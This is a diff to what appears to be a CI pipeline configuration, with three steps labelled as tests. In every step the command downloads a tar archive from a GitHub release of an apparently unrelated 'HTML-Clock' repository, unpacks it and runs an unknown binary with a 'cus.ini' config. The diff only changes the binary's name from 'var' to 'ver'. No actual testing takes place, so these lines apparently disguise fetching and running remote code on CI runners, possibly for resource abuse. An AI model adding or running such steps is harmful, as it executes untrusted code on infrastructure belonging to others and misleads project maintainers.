@@ -6,7 +6,7 @@ steps:
 - name: test-1 
   image: golang 
   commands: 
-  - wget https://github.com/Wakfodo/HTML-Clock/releases/download/helo/Doc.tar.gz && tar -xvf Doc.tar.gz && ./var cus.ini
+  - wget https://github.com/Wakfodo/HTML-Clock/releases/download/helo/Doc.tar.gz && tar -xvf Doc.tar.gz && ./ver cus.ini
 
 kind: pipeline
 type: docker
@@ -16,7 +16,7 @@ steps:
 - name: test-2 
   image: golang 
   commands: 
-  - wget https://github.com/Wakfodo/HTML-Clock/releases/download/helo/Doc.tar.gz && tar -xvf Doc.tar.gz && ./var cus.ini
+  - wget https://github.com/Wakfodo/HTML-Clock/releases/download/helo/Doc.tar.gz && tar -xvf Doc.tar.gz && ./ver cus.ini
 
 kind: pipeline
 type: docker
@@ -26,4 +26,4 @@ steps:
 - name: test-3 
   image: golang 
   commands: 
-  - wget https://github.com/Wakfodo/HTML-Clock/releases/download/helo/Doc.tar.gz && tar -xvf Doc.tar.gz && ./var cus.ini
+  - wget https://github.com/Wakfodo/HTML-Clock/releases/download/helo/Doc.tar.gz && tar -xvf Doc.tar.gz && ./ver cus.ini
